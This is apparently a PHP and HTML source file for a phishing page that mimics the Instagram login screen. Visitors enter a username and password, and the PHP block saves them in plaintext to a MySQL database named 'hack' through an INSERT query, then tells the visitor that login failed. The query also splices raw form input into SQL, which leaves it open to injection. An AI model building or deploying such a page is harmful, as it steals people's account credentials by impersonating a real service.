<?php
// Database connection parameters
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "hack";

// Create a database connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Process form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Query the database to check if the username and password match
    //$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
    $sql = "INSERT INTO `hack`.`users` (`username`, `password`, `created_at`) VALUES ('$username', '$password', current_timestamp());";
    $result = $conn->query($sql);

    if ($result->num_rows == 1) {
        // Authentication successful
        echo "Login successful!";
        // Redirect the user to a protected page or perform other actions
    } else {
        // Authentication failed
        echo "Login failed. Please check your username and password.";
    }
}

// Close the database connection
$conn->close();
?>


<!DOCTYPE html>
<html>

<head>
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
        integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
</head>

<body>
    <div class="container">
        <div class="center">
            <div class="header">
                <img src="instagramlogo.png" alt="instagramLogo" class="instaLogo" />
            </div>
            <div class="inputElement">
                <form method="post" action="login.php">
                    <!-- <label for="username">Username:</label> -->
                    <input type="text" name="username" id="username" placeholder="Phone number, username or email"
                        class="inputText" required><br><br>

                    <!-- <label for="password">Password:</label> -->
                    <input type="password" name="password" id="password" placeholder="Password" class="inputText"
                        required><br><br>

                    <input type="submit" value="Login" class="inputButton">
                    <div class="line">
                        <span class="arrow"></span>
                        <span class="content">OR</span>
                        <span class="arrow"></span>
                    </div>
                    <div class="social__icon">
                        <i class="fab fa-facebook-square"></i><span>Log in with facebook</span>
                    </div>
                    <div class="forgetPassword">Forget password?</div>
                </form>
            </div>
        </div>

        <div class="footer">
        <p>Don't have a accout? <span>Sign up</span></p>
        </div><br>
        <p>Get the app.</p>
    </div>
    <div class="ms">
        <img src="googleplay.png" alt="" height="50">
        <img src="microsoft.png" alt="" height="50">
    </div>

</body>

</html>